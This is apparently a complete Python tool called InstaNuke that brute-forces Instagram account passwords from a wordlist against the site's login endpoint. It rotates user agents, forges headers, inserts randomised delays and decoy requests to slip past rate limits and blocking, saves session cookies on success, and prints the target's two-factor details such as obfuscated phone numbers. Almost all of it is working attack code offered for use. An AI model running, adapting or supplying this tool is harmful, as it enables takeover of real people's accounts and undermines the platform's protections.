#!/usr/bin/env python3
import requests
import json
import time
import random
import hashlib
from datetime import datetime
import os
import numpy as np

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
]

class InstaNuke:
    def __init__(self, username):
        self.session = requests.Session()
        self.username = username
        self.request_count = 0
        self.ghost_counter = 0
        self.last_request = datetime.now()
        self.load_cookies()
        self.setup_headers()

    def load_cookies(self):
        try:
            with open(f"cookies_{self.username}.json", "r") as f:
                self.session.cookies.update(json.load(f))
        except FileNotFoundError:
            pass

    def save_cookies(self):
        with open(f"cookies_{self.username}.json", "w") as f:
            json.dump(self.session.cookies.get_dict(), f)

    def setup_headers(self):
        lang = random.choice(["en", "it", "es"])
        self.session.headers = {
            "User-Agent": random.choice(user_agents),
            "X-IG-App-ID": "1217981644879628",
            "X-IG-WWW-Claim": "0" if random.random() > 0.8 else f"hmac.{hashlib.sha256(str(random.random()).encode()).hexdigest()}",
            "Accept-Language": f"{lang}-{lang.upper()},{lang};q=0.{random.randint(5, 9)}",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": random.choice([
                f"https://www.instagram.com/{self.username}/",
                "https://www.instagram.com/",
                "https://www.instagram.com/accounts/login/",
                "https://www.instagram.com/explore/"
            ])
        }

    def human_delay(self):
        base_delay = abs(np.random.normal(7, 2))
        additional_delay = self.request_count * 0.3
        time.sleep(max(3, min(base_delay + additional_delay, 20)))

        if random.random() > 0.85:
            time.sleep(random.uniform(8, 15))

    def ghost_request(self):
        endpoints = [
            "https://www.instagram.com/data/shared_data/",
            "https://www.instagram.com/static/bundles/es6/Consumer.js"
        ]
        try:
            self.session.get(random.choice(endpoints), timeout=3)
        except:
            pass

    def get_csrf_token(self):
        try:
            r = self.session.get(
                "https://www.instagram.com/data/shared_data/",
                timeout=10
            )
            if r.status_code == 200:
                return r.json().get("config", {}).get("csrf_token")
            elif r.status_code == 429:
                time.sleep(60)
        except Exception:
            pass
        return None

    def attempt_login(self, username, password):
        global data
        global response
        self.human_delay()
        self.request_count += 1
        self.ghost_counter += 1

        if self.ghost_counter >= 5:
            self.ghost_request()
            self.ghost_counter = 0

        try:
            csrf_token = self.get_csrf_token()
            if not csrf_token:
                return False, "CSRF Token missing"

            login_data = {
                "username": username,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "queryParams": json.dumps({}),
                "optIntoOneTap": "false"
            }

            self.session.headers.update({
                "X-CSRFToken": csrf_token,
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.instagram.com/accounts/login/"
            })

            response = self.session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=login_data,
                timeout=15
            )

            if response.status_code == 429:
                time.sleep(120)
                return False, f"{Colors.YELLOW}[INFO] Rate Limited {response.status_code} | {response.reason}{Colors.RESET}"
            elif response.status_code == 403:
                self.setup_headers()
                return False, f"{Colors.RED}[INFO] Blocked {response.status_code} | {response.reason}{Colors.RESET}"

            data = response.json()

            if data.get("authenticated"):
                self.save_cookies()
                return True, f"{Colors.GREEN}Authenticated{Colors.RESET}"
            elif data.get("two_factor_required"):
                return True, f"{Colors.YELLOW}2FA Required{Colors.RESET}"
            elif data.get("user") is False:
                return False, f"{Colors.RED}Invalid User{Colors.RESET}"
            else:
                return False, data.get("message", "Error")

        except Exception as e:
            return False, f"{Colors.RED}[ERROR]{e}{Colors.RESET}"

def tfa_info():
    if data:
        print(f"[{Colors.BLUE}help{Colors.RESET}] a login code has been sent to the user")
        print(f"[{Colors.BLUE}id{Colors.RESET}] {data.get('two_factor_info', {}).get('pk', 'unknown')}{Colors.RESET}")
        print(f"[{Colors.BLUE}sms{Colors.RESET}] {'enabled' if data.get('two_factor_info', {}).get('sms_two_factor_on', 'unknown') else 'disabled'}{Colors.RESET}")
        print(f"[{Colors.BLUE}whatsapp{Colors.RESET}] {'enabled' if data.get('two_factor_info', {}).get('whatsapp_two_factor_on', 'unknown') else 'disabled'}{Colors.RESET}")
        print(f"[{Colors.BLUE}totp{Colors.RESET}] {'enabled' if data.get('two_factor_info', {}).get('whatsapp_two_factor_on', 'unknown') else 'disabled'}{Colors.RESET}")
        print(f"[{Colors.BLUE}phone number{Colors.RESET}] {data.get('two_factor_info', {}).get('obfuscated_phone_number_2', 'unknown')}{Colors.RESET}")
        print(f"[{Colors.BLUE}phone digits{Colors.RESET}] {data.get('two_factor_info', {}).get('obfuscated_phone_number', 'unknown')}{Colors.RESET}")
        print(f"[{Colors.BLUE}type{Colors.RESET}] {data.get('error_type', 'unknown')}{Colors.RESET}")

def banner():
    print(rf"""
 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄       ███▄    █  █    ██  ██ ▄█▀▓█████
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒      ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░
 ░           ░       ░                 ░  ░         ░    ░     ░  ░      ░  ░
""")

def main():
    try:
        os.system('clear')
        banner()
        username = str(input("Username: ").strip().lower())
        if not username:
            print(f"{Colors.YELLOW}[INFO] Enter a valid username{Colors.RESET}")
            return
        wordlist_path = str(input("Wordlist: ").strip())

        auditor = InstaNuke(username)

        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[ERROR] Wordlist not found{Colors.RESET}")
            return

        print(f"\n{Colors.YELLOW}[INFO] InstaNuke Attack @ {datetime.now().strftime('%H:%M:%S')}{Colors.RESET}")
        for i, password in enumerate(passwords, 1):
            print(f"[ATTEMPT {i}] {password}")

            success, message = auditor.attempt_login(username, password)

            if success or message == 'checkpoint_required':
                print(f"\n[{Colors.GREEN}success{Colors.RESET}] username: {Colors.GREEN}{username}{Colors.RESET}  password: {Colors.GREEN}{password}{Colors.RESET}")
                if '2FA' in message:
                    tfa_info()
                else:
                     print(f"[{Colors.BLUE}{message}{Colors.RESET}]")
                     break
            else:
                 print(f"[RESULT] {message} {response.status_code} | {response.reason}")

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}InstaNuke Interrupted{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[ERROR] {e}{Colors.RESET}")
    finally:
        end_time = datetime.now().strftime('%H:%M:%S')
        end_data = f"{datetime.now().year}/{datetime.now().month}/{datetime.now().day}"
        print(f"\n{Colors.BLUE}InstaNuke session ended at {end_time} @ {end_data}{Colors.RESET}")

if __name__ == "__main__":
    main()
